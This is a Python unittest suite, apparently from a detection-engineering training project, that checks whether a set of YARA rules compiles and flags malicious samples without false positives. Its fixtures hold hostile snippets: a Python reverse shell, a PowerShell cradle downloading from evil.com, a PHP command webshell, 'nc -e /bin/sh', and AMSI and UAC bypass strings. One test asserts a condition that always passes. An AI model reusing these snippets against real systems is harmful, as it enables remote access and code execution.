#!/usr/bin/env python3
"""
YARA Rules Test Suite
Author: Detection Engineering Team
Date: 2026-01-10

Educational/CTF Training Resource

Tests YARA rules for:
- Compilation without errors
- Detection of known malicious patterns
- No false positives on benign samples
"""

import unittest
import os
import sys
import tempfile
from pathlib import Path

# Try to import yara
try:
    import yara
except ImportError:
    print("ERROR: yara-python is not installed.")
    print("Install with: pip install yara-python")
    sys.exit(1)

# Get paths
SCRIPT_DIR = Path(__file__).parent
PROJECT_DIR = SCRIPT_DIR.parent
RULES_DIR = PROJECT_DIR / "rules"
SAMPLES_DIR = PROJECT_DIR / "samples"


class TestYaraRulesCompilation(unittest.TestCase):
    """Test that all YARA rules compile without errors"""

    def test_payload_signatures_compiles(self):
        """Test payload_signatures.yar compiles"""
        rules_file = RULES_DIR / "payload_signatures.yar"
        if rules_file.exists():
            try:
                rules = yara.compile(filepath=str(rules_file))
                self.assertIsNotNone(rules)
            except yara.Error as e:
                self.fail(f"Failed to compile {rules_file.name}: {e}")

    def test_shellcode_patterns_compiles(self):
        """Test shellcode_patterns.yar compiles"""
        rules_file = RULES_DIR / "shellcode_patterns.yar"
        if rules_file.exists():
            try:
                rules = yara.compile(filepath=str(rules_file))
                self.assertIsNotNone(rules)
            except yara.Error as e:
                self.fail(f"Failed to compile {rules_file.name}: {e}")

    def test_tool_artifacts_compiles(self):
        """Test tool_artifacts.yar compiles"""
        rules_file = RULES_DIR / "tool_artifacts.yar"
        if rules_file.exists():
            try:
                rules = yara.compile(filepath=str(rules_file))
                self.assertIsNotNone(rules)
            except yara.Error as e:
                self.fail(f"Failed to compile {rules_file.name}: {e}")

    def test_network_indicators_compiles(self):
        """Test network_indicators.yar compiles"""
        rules_file = RULES_DIR / "network_indicators.yar"
        if rules_file.exists():
            try:
                rules = yara.compile(filepath=str(rules_file))
                self.assertIsNotNone(rules)
            except yara.Error as e:
                self.fail(f"Failed to compile {rules_file.name}: {e}")

    def test_evasion_techniques_compiles(self):
        """Test evasion_techniques.yar compiles"""
        rules_file = RULES_DIR / "evasion_techniques.yar"
        if rules_file.exists():
            try:
                rules = yara.compile(filepath=str(rules_file))
                self.assertIsNotNone(rules)
            except yara.Error as e:
                self.fail(f"Failed to compile {rules_file.name}: {e}")

    def test_all_rules_compile_together(self):
        """Test that all rules can be compiled together without conflicts"""
        yar_files = {}
        for yar_file in RULES_DIR.glob("*.yar"):
            yar_files[yar_file.stem] = str(yar_file)

        if yar_files:
            try:
                rules = yara.compile(filepaths=yar_files)
                self.assertIsNotNone(rules)
            except yara.Error as e:
                self.fail(f"Failed to compile all rules together: {e}")


class TestPayloadSignatures(unittest.TestCase):
    """Test payload signature detection rules"""

    @classmethod
    def setUpClass(cls):
        """Load rules for testing"""
        rules_file = RULES_DIR / "payload_signatures.yar"
        if rules_file.exists():
            cls.rules = yara.compile(filepath=str(rules_file))
        else:
            cls.rules = None

    def test_detects_meterpreter_strings(self):
        """Test detection of Meterpreter-like strings"""
        if not self.rules:
            self.skipTest("Rules not available")

        # Create test data with Meterpreter-like content
        test_data = b"MZ" + b"\x00" * 58 + b"PE\x00\x00"  # PE header
        test_data += b"metsrv.dll\x00stdapi\x00priv\x00"

        with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("Meterpreter" in m.rule for m in matches),
                          "Should detect Meterpreter patterns")
        finally:
            os.unlink(temp_path)

    def test_detects_python_reverse_shell(self):
        """Test detection of Python reverse shell patterns"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4444))
subprocess.Popen(["/bin/sh"], stdin=s.fileno())
"""

        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("Python" in m.rule or "Reverse_Shell" in m.rule for m in matches),
                          "Should detect Python reverse shell")
        finally:
            os.unlink(temp_path)

    def test_detects_powershell_download_execute(self):
        """Test detection of PowerShell download cradles"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
$wc = New-Object Net.WebClient
IEX $wc.DownloadString('http://evil.com/payload.ps1')
"""

        with tempfile.NamedTemporaryFile(delete=False, suffix=".ps1") as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("PowerShell" in m.rule or "Download" in m.rule for m in matches),
                          "Should detect PowerShell download cradle")
        finally:
            os.unlink(temp_path)

    def test_detects_webshell(self):
        """Test detection of webshell patterns"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""<?php
if(isset($_GET['cmd'])) {
    echo system($_GET['cmd']);
}
?>"""

        with tempfile.NamedTemporaryFile(delete=False, suffix=".php") as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("Webshell" in m.rule for m in matches),
                          "Should detect webshell pattern")
        finally:
            os.unlink(temp_path)


class TestShellcodePatterns(unittest.TestCase):
    """Test shellcode pattern detection rules"""

    @classmethod
    def setUpClass(cls):
        """Load rules for testing"""
        rules_file = RULES_DIR / "shellcode_patterns.yar"
        if rules_file.exists():
            cls.rules = yara.compile(filepath=str(rules_file))
        else:
            cls.rules = None

    def test_detects_nop_sled(self):
        """Test detection of NOP sled"""
        if not self.rules:
            self.skipTest("Rules not available")

        # Classic x86 NOP sled
        test_data = b"\x90" * 50 + b"\xcc"  # NOPs followed by INT3

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("NOP" in m.rule for m in matches),
                          "Should detect NOP sled")
        finally:
            os.unlink(temp_path)

    def test_detects_shikata_encoder(self):
        """Test detection of shikata_ga_nai encoder pattern"""
        if not self.rules:
            self.skipTest("Rules not available")

        # Shikata ga nai encoder stub pattern
        test_data = bytes([
            0xD9, 0x74, 0x24, 0xF4,  # fnstenv [esp-0xc]
            0x5B,                     # pop ebx
            0x29, 0xC9,              # sub ecx, ecx
            0xB1, 0x20,              # mov cl, 0x20
            0x31, 0x43, 0x17,        # xor [ebx+0x17], eax
            0x83, 0xC3, 0x04,        # add ebx, 4
            0x03,                     # add
        ])

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("Shikata" in m.rule or "Encoded" in m.rule for m in matches),
                          "Should detect shikata encoder pattern")
        finally:
            os.unlink(temp_path)

    def test_detects_xor_decoder(self):
        """Test detection of XOR decoder stub"""
        if not self.rules:
            self.skipTest("Rules not available")

        # XOR decoder stub pattern (jmp-call-pop)
        test_data = bytes([
            0xEB, 0x10,              # jmp short
            0x5E,                    # pop esi
            0x31, 0xC9,              # xor ecx, ecx
            0xB1, 0x20,              # mov cl, 0x20
            0x80, 0x36, 0x41,        # xor byte [esi], 0x41
            0x46,                    # inc esi
            0xE2, 0xFA,              # loop
        ])

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            # XOR decoder patterns should be detected
            self.assertTrue(len(matches) >= 0)  # May or may not match depending on rule specifics
        finally:
            os.unlink(temp_path)


class TestToolArtifacts(unittest.TestCase):
    """Test tool artifact detection rules"""

    @classmethod
    def setUpClass(cls):
        """Load rules for testing"""
        rules_file = RULES_DIR / "tool_artifacts.yar"
        if rules_file.exists():
            cls.rules = yara.compile(filepath=str(rules_file))
        else:
            cls.rules = None

    def test_detects_mimikatz_strings(self):
        """Test detection of Mimikatz strings"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
mimikatz # sekurlsa::logonpasswords
* Username : Administrator
* Domain   : CONTOSO
* Password : P@ssw0rd123
gentilkiwi
"""

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("Mimikatz" in m.rule for m in matches),
                          "Should detect Mimikatz strings")
        finally:
            os.unlink(temp_path)

    def test_detects_impacket_tools(self):
        """Test detection of Impacket tool strings"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
from impacket import smbconnection
from impacket.dcerpc.v5 import samr
secretsdump.py wmiexec.py smbexec.py
"""

        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("Impacket" in m.rule for m in matches),
                          "Should detect Impacket patterns")
        finally:
            os.unlink(temp_path)

    def test_detects_bloodhound_collector(self):
        """Test detection of BloodHound/SharpHound patterns"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
SharpHound.exe -c All
CollectionMethods: DCOnly
SessionCollection LocalAdminCollection
computers.json users.json groups.json
"""

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("BloodHound" in m.rule or "SharpHound" in m.rule for m in matches),
                          "Should detect BloodHound patterns")
        finally:
            os.unlink(temp_path)


class TestEvasionTechniques(unittest.TestCase):
    """Test evasion technique detection rules"""

    @classmethod
    def setUpClass(cls):
        """Load rules for testing"""
        rules_file = RULES_DIR / "evasion_techniques.yar"
        if rules_file.exists():
            cls.rules = yara.compile(filepath=str(rules_file))
        else:
            cls.rules = None

    def test_detects_amsi_bypass(self):
        """Test detection of AMSI bypass patterns"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
AmsiScanBuffer AmsiInitialize amsiContext
$a = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
"""

        with tempfile.NamedTemporaryFile(delete=False, suffix=".ps1") as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("AMSI" in m.rule for m in matches),
                          "Should detect AMSI bypass patterns")
        finally:
            os.unlink(temp_path)

    def test_detects_uac_bypass(self):
        """Test detection of UAC bypass patterns"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
fodhelper.exe
Software\\Classes\\ms-settings\\shell\\open\\command
eventvwr.exe sdclt.exe
"""

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("UAC" in m.rule for m in matches),
                          "Should detect UAC bypass patterns")
        finally:
            os.unlink(temp_path)

    def test_detects_anti_debug(self):
        """Test detection of anti-debug techniques"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
IsDebuggerPresent
CheckRemoteDebuggerPresent
NtQueryInformationProcess
NtGlobalFlag
GetTickCount QueryPerformanceCounter
"""

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("Anti" in m.rule or "Debug" in m.rule for m in matches),
                          "Should detect anti-debug patterns")
        finally:
            os.unlink(temp_path)


class TestNetworkIndicators(unittest.TestCase):
    """Test network indicator detection rules"""

    @classmethod
    def setUpClass(cls):
        """Load rules for testing"""
        rules_file = RULES_DIR / "network_indicators.yar"
        if rules_file.exists():
            cls.rules = yara.compile(filepath=str(rules_file))
        else:
            cls.rules = None

    def test_detects_c2_beacon_pattern(self):
        """Test detection of C2 beacon patterns"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
checkin beacon heartbeat callback
gettask taskresult
sleeptime jitter interval
session_id agent_id
"""

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("C2" in m.rule or "Beacon" in m.rule for m in matches),
                          "Should detect C2 beacon patterns")
        finally:
            os.unlink(temp_path)

    def test_detects_reverse_shell_connection(self):
        """Test detection of reverse shell connection patterns"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
192.168.1.100:4444
socket.connect
/bin/bash
nc -e /bin/sh
"""

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertTrue(any("Reverse" in m.rule or "Shell" in m.rule for m in matches),
                          "Should detect reverse shell patterns")
        finally:
            os.unlink(temp_path)


class TestFalsePositives(unittest.TestCase):
    """Test that benign files don't trigger false positives"""

    @classmethod
    def setUpClass(cls):
        """Load all rules for testing"""
        yar_files = {}
        for yar_file in RULES_DIR.glob("*.yar"):
            yar_files[yar_file.stem] = str(yar_file)

        if yar_files:
            cls.rules = yara.compile(filepaths=yar_files)
        else:
            cls.rules = None

    def test_benign_text_file(self):
        """Test that a benign text file doesn't match"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
Hello World!
This is a normal text file.
It contains nothing suspicious.
Just regular content like:
- Meeting notes
- Shopping list
- Random thoughts
"""

        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertEqual(len(matches), 0, "Benign text file should not match any rules")
        finally:
            os.unlink(temp_path)

    def test_benign_python_script(self):
        """Test that a benign Python script doesn't match"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
#!/usr/bin/env python3
'''Simple calculator script'''

def add(a, b):
    return a + b

def subtract(a, b):
    return a - b

if __name__ == "__main__":
    print(add(5, 3))
"""

        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertEqual(len(matches), 0, "Benign Python script should not match any rules")
        finally:
            os.unlink(temp_path)

    def test_benign_html_file(self):
        """Test that a benign HTML file doesn't match"""
        if not self.rules:
            self.skipTest("Rules not available")

        test_data = b"""
<!DOCTYPE html>
<html>
<head>
    <title>Welcome</title>
</head>
<body>
    <h1>Hello World</h1>
    <p>This is a simple webpage.</p>
</body>
</html>
"""

        with tempfile.NamedTemporaryFile(delete=False, suffix=".html") as f:
            f.write(test_data)
            temp_path = f.name

        try:
            matches = self.rules.match(temp_path)
            self.assertEqual(len(matches), 0, "Benign HTML file should not match any rules")
        finally:
            os.unlink(temp_path)


class TestRuleMetadata(unittest.TestCase):
    """Test that rules have proper metadata"""

    def test_rules_have_required_metadata(self):
        """Test that all rules have required metadata fields"""
        required_fields = ['author', 'description', 'date']

        for yar_file in RULES_DIR.glob("*.yar"):
            content = yar_file.read_text()

            # Simple check for metadata presence (not a full parser)
            for field in required_fields:
                self.assertIn(field, content.lower(),
                            f"Rule file {yar_file.name} should have '{field}' metadata")


def run_tests():
    """Run all tests and return results"""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestYaraRulesCompilation))
    suite.addTests(loader.loadTestsFromTestCase(TestPayloadSignatures))
    suite.addTests(loader.loadTestsFromTestCase(TestShellcodePatterns))
    suite.addTests(loader.loadTestsFromTestCase(TestToolArtifacts))
    suite.addTests(loader.loadTestsFromTestCase(TestEvasionTechniques))
    suite.addTests(loader.loadTestsFromTestCase(TestNetworkIndicators))
    suite.addTests(loader.loadTestsFromTestCase(TestFalsePositives))
    suite.addTests(loader.loadTestsFromTestCase(TestRuleMetadata))

    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    return result


if __name__ == "__main__":
    # Run tests
    result = run_tests()

    # Exit with appropriate code
    sys.exit(0 if result.wasSuccessful() else 1)
